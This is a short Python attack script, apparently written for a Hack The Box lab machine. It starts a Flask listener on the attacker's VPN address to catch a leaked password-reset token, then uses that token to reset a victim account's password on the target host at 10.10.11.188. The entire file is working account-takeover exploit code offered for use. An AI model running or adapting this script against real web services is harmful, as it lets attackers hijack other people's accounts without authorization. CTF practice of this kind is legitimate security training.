#!/usr/bin/python3

import netifaces as ni, logging, requests
from flask import Flask, request
import urllib.parse

app = Flask(__name__)

tun_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr'] # if you have multiple vpn connection replace this variable with you HTB IP address
port   = 9980

password  = "qwerty"                                   # You can pick any password you want  

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
@app.route("/reset")
def reset():
    try:
        token = urllib.parse.quote(request.args.get('token'))
        print(f"Token: {token}")
        data      = {"password":f"{password}", "cpassword":f"{password}"}
        reset_pwd = requests.post(f"http://10.10.11.188/reset?token={token}", data=data)
        if 'Success' in reset_pwd.text:
            print(f"Successfully changed password to: {data['password']}")
        else:
            print(f"Invalid Token")
    except:
        pass
    return "Done"

if __name__ == "__main__":
    app.run(host=tun_ip, port=port, debug=True)
